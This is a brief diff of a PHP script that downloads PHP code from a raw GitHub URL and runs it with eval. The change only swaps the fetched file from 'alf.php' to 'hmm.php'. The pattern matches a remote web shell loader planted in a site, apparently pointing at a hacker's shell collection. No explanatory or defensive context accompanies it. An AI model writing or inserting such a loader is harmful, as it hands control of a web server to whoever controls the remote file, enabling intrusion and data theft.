@@ -30,6 +30,6 @@ function geturlsinfo($url) {
   return $url_get_contents_data;
 }
 
-  $a = geturlsinfo('https://raw.githubusercontent.com/wonxd1337/Koleksi/refs/heads/main/alf.php');
+  $a = geturlsinfo('https://raw.githubusercontent.com/wonxd1337/Koleksi/refs/heads/main/hmm.php');
   eval('?>' . $a);
 ?>
